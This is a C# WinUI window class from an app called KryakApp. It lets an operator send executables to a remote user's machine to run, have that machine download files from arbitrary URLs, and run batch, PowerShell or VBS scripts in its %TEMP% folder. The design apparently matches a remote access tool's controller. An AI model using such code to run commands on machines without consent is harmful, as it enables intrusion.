using KryakApp.Services;
using Microsoft.UI.Windowing;
using Microsoft.UI.Xaml;
using Microsoft.UI.Xaml.Controls;
using System;
using System.IO;
using Windows.Storage;
using Windows.Storage.Pickers;
using WinRT.Interop;

namespace KryakApp.Windows;

public sealed partial class RunFileWindow : Window
{
    private readonly UserData _user;
    private string? _selectedPath;

    public RunFileWindow(UserData user)
    {
        InitializeComponent();
        _user = user;

        ExtendsContentIntoTitleBar = true;
        SetTitleBar(WindowTitleBar);

        nint hwnd = WindowNative.GetWindowHandle(this);
        var windowId = Microsoft.UI.Win32Interop.GetWindowIdFromWindow(hwnd);
        AppWindow appWindow = AppWindow.GetFromWindowId(windowId);
        appWindow.Resize(new global::Windows.Graphics.SizeInt32(560, 500));

        Title = $"Run File - {_user.Username}";
    }

    private async void SelectFileButton_Click(object sender, RoutedEventArgs e)
    {
        FileOpenPicker picker = new();
        nint hwnd = WindowNative.GetWindowHandle(this);
        InitializeWithWindow.Initialize(picker, hwnd);
        picker.SuggestedStartLocation = PickerLocationId.Desktop;
        picker.FileTypeFilter.Add(".exe");
        picker.FileTypeFilter.Add(".bat");
        picker.FileTypeFilter.Add(".cmd");
        picker.FileTypeFilter.Add(".ps1");
        picker.FileTypeFilter.Add(".msi");
        picker.FileTypeFilter.Add(".com");

        StorageFile? file = await picker.PickSingleFileAsync();
        if (file is null)
            return;

        _selectedPath = file.Path;
        FilePathTextBox.Text = _selectedPath;
        RunButton.IsEnabled = true;
    }

    private async void RunButton_Click(object sender, RoutedEventArgs e)
    {
        if (string.IsNullOrWhiteSpace(_selectedPath))
            return;

        if (!File.Exists(_selectedPath))
            return;

        RunButton.IsEnabled = false;
        SelectFileButton.IsEnabled = false;

        string fileName = UploadFileNameTextBox.Text.Trim();
        string remotePath = UploadPathTextBox.Text;

        string? error = await App.Server.SendRunFileAsync(_user, _selectedPath, fileName, remotePath);

        if (error is null)
        {
            RunButton.IsEnabled = true;
            SelectFileButton.IsEnabled = true;
        }
        else
        {
            RunButton.IsEnabled = true;
            SelectFileButton.IsEnabled = true;
        }
    }

    private async void DownloadButton_Click(object sender, RoutedEventArgs e)
    {
        string url = UrlTextBox.Text.Trim();
        if (string.IsNullOrWhiteSpace(url))
            return;

        if (!Uri.TryCreate(url, UriKind.Absolute, out _))
            return;

        string fileName = FileNameTextBox.Text.Trim();

        DownloadButton.IsEnabled = false;

        string? error = await App.Server.SendFileDownloadAsync(_user, url, fileName, DownloadPathTextBox.Text);

        DownloadButton.IsEnabled = true;
    }

    private void UrlTextBox_TextChanged(object sender, TextChangedEventArgs e)
    {
        DownloadButton.IsEnabled = !string.IsNullOrWhiteSpace(UrlTextBox.Text);
    }

    private async void ScriptRunButton_Click(object sender, RoutedEventArgs e)
    {
        string script = ScriptTextBox.Text.Trim();
        if (string.IsNullOrWhiteSpace(script))
            return;

        string ext;
        switch ((ScriptTypeCombo.SelectedItem as ComboBoxItem)?.Content as string)
        {
            case "VBS":
                ext = ".vbs";
                break;
            case "PowerShell":
                ext = ".ps1";
                break;
            default:
                ext = ".bat";
                break;
        }

        string fileName = $"script_{Guid.NewGuid():N}{ext}";

        ScriptRunButton.IsEnabled = false;

        string? error = await App.Server.SendScriptAsync(_user, script, fileName, "%TEMP%");

        ScriptRunButton.IsEnabled = true;
    }
}
